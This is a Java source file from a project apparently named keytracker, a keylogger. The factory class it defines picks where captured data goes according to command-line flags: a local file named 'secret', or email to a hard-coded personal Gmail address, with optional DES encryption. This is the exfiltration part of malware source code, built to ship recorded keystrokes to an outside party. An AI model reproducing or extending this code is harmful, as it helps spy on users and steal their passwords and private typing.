package com.keytracker;

import com.keytracker.encrypt.Encryptor;
import com.keytracker.encrypt.KeyGen;
import com.keytracker.file.MyFileWriter;
import com.keytracker.file.MyMailWriter;
import com.keytracker.file.Writer;
import com.keytracker.mail.MailSender;

import java.util.Map;

public class MechanismsFactory {
    private static final String FILE = "file";
    private static final String MAIL = "mail";
    private static final String CRYPT = "crypt";
    private final ArgsResolver argsResolver;

    public MechanismsFactory(ArgsResolver argsResolver) {
        this.argsResolver = argsResolver;
    }

    public StoreMechanism getStoreMechanism() {
        Writer fileWriter = null;
        Writer mailWriter = null;

        Map<String, Boolean> argsMap = argsResolver.getArgsMap();

        if (argsMap.containsKey(FILE)) fileWriter = new MyFileWriter("secret");
        if (argsMap.containsKey(MAIL)) mailWriter = new MyMailWriter(new MailSender(), "radoslawwitek@gmail.com");

        return new BundledStoreMechanism(fileWriter, mailWriter);
    }

    public Encryptor getEncryptor(KeyGen keyGen) {
        Map<String, Boolean> argsMap = argsResolver.getArgsMap();
        if (argsMap.containsKey(CRYPT)) {
            return new Encryptor(keyGen.generate("DES"), "DES");
        }
        return null;
    }
}
